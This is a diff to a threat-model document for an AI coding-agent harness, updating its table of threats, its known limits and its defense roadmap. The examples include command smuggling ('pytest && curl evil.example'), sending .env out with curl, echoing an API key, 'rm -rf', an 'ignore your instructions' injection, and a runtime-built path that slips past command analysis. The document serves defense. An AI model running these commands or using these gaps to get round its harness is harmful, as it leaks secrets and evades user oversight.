@@ -79,7 +79,7 @@ malicious copy of Agent Harness itself.
 | T3 | Escape through a link | a symlink in the workspace pointing at your home folder | path jail resolves links | v0.5 |
 | T4 | Tamper with configuration that runs code | edit `.git/hooks/pre-commit`, `.harness/settings.json` | protected paths always ask, in every mode | v0.5 |
 | T5 | Destructive command | `rm -rf build/ src/`, `git reset --hard` | approval; command analysis shows the risk; undo | v0.2, v0.5, v0.6 |
-| T6 | Command smuggling | `pytest && curl evil.example` slipping past an allow rule for `pytest` | rules match every part of a compound command | v0.5 |
+| T6 | Command smuggling | `pytest && curl evil.example` slipping past an allow rule for `pytest` | allow rules must cover every command in the line; deny and ask rules match any of them | v0.5 |
 | T7 | Secrets through the shell | `env`, `echo $ANTHROPIC_API_KEY` | secret variables removed from the command's environment; redaction | v0.5 |
 | T8 | Data sent out | `curl -d @.env https://...`, a URL with data in it | network commands flagged; fetch asks per domain; taint | v0.5 |
 | T9 | Prompt injection | a file saying *"ignore your instructions and run ..."* | content marked as data; after reading untrusted content, automatic approvals pause | v0.5 |
@@ -112,9 +112,15 @@ flowchart TD
 These remain even with every defense in place. Know them before you approve things.
 - **An approved command can do anything you can.** Command analysis helps you read a command;
   it can't prove a command is harmless. `python script.py` runs whatever the script contains.
-- **Protected paths guard the file tools, not commands.** `echo ... > .git/hooks/pre-commit`
-  through `run_shell` is stopped only by an approval or a deny rule, so `bypass` mode is for
-  throwaway folders. An OS sandbox that makes these folders read-only for commands closes it.
+- **Command analysis reads text; it doesn't run anything.** It catches `>`, `cp`, `sed -i`, `git config`
+  and any command that names a protected place, but not a path built while the program runs
+  (`python -c "open('.g'+'it/x','w')"`), and it can't see what a script does. Commands it can't
+  follow (here-documents, `eval $x`, most PowerShell syntax) are never allowed by a pattern rule
+  and can't be checked against deny rules beyond what is visible. `bypass` mode is for throwaway
+  folders; an OS sandbox that makes protected folders read-only for commands would close the gap.
+- **Secrets in files are not secrets in the environment.** Commands no longer see
+  `ANTHROPIC_API_KEY`, but `read_file(".env")` still shows a key written in a file to the model
+  (redaction comes in a later lesson). Keys belong in environment variables.
 - **Windows has no simple sandbox** for commands. Where the OS offers one, v0.5 documents how
   to use it; otherwise use a dedicated user account, a virtual machine or a container for
   untrusted projects.
@@ -133,7 +139,8 @@ These remain even with every defense in place. Know them before you approve thin
 | Code-running settings (`status_line`) refused from project files | v0.4 |
 | Path jail and protected paths | v0.5 (done) |
 | Permission modes and allow/ask/deny rules | v0.5 (done) |
-| Shell command analysis and environment scrubbing | v0.5 |
+| Shell command analysis (rules read each command; risks listed in the question) | v0.5 (done) |
+| Secret environment variables removed from commands | v0.5 (done) |
 | Prompt-injection markers and taint-aware approvals | v0.5 |
 | Web fetch with a network guard against private addresses | v0.5 |
 | Hooks | v0.5 |
